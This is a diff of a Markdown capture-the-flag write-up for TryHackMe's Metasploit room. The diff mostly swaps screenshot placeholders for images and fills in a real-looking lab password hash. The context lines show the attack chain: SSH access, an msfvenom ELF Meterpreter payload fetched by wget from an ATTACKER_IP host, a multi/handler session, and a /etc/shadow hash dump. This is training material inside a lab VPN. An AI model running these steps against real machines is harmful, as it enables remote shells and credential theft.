@@ -113,8 +113,6 @@ ssh murphy@<VICTIM_IP>
 sudo su
 ```
 
-<!-- screenshots/01-ssh-connection.png -->
-
 ### 2. Generate the `.elf` payload with msfvenom
 
 On the attacker machine, create the Meterpreter payload in ELF format (Linux executable):
@@ -165,7 +163,6 @@ wget http://<ATTACKER_IP>:9000/shell.elf
 > [!NOTE]
 > The Python HTTP server serves every file in the current working directory. Since this lab runs inside the TryHackMe VPN, only machines within that environment can access it.
 
-<!-- screenshots/03-file-transfer.png -->
 
 ### 4. Configure the multi/handler
 
@@ -190,8 +187,6 @@ run
 > [!TIP]
 > Always run `show options` before `run` to confirm that `LHOST` and `LPORT` are correct. It becomes a habit that prevents 80% of silly mistakes.
 
-<!-- screenshots/04-handler-running.png -->
-
 ### 5. Run the payload on the victim machine
 
 Back in the victim's SSH session, make the file executable and run it:
@@ -214,8 +209,6 @@ After execution, the handler on the attacker machine should show:
 
 meterpreter >
 ```
-
-<!-- screenshots/05-meterpreter-session.png -->
 
 ### 6. Post-exploitation — Linux hash dump
 
@@ -245,12 +238,12 @@ cat /etc/shadow
 The output lists all users with their hashes in the format:
 
 ```
-user:$6$salt$hash:dayssince1970:0:99999:7:::
+$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
 ```
 
 Copy the hash of the user requested by the room and submit it as the answer in the TryHackMe panel.
 
-<!-- screenshots/06-hash-dump.png -->
+<img width="1157" height="108" alt="Captura de tela 2026-06-28 180609" src="https://github.com/user-attachments/assets/8468bbce-02cf-481e-aa92-2994efeb5ccf" />
 
 ---
 
@@ -289,7 +282,7 @@ More importantly, it reinforced an important lesson: in cybersecurity, knowing h
 
 ## References
 
-- [TryHackMe — Metasploit: Introduction](https://tryhackme.com/room/metasploitintro)
+- [TryHackMe — Metasploit: Introduction](https://tryhackme.com/room/metasploitexploitation)
 - [Official Metasploit documentation](https://docs.metasploit.com/)
 - [Offensive Security — msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
 - [`msfvenom` manual](https://www.kali.org/tools/metasploit-framework/#msfvenom)
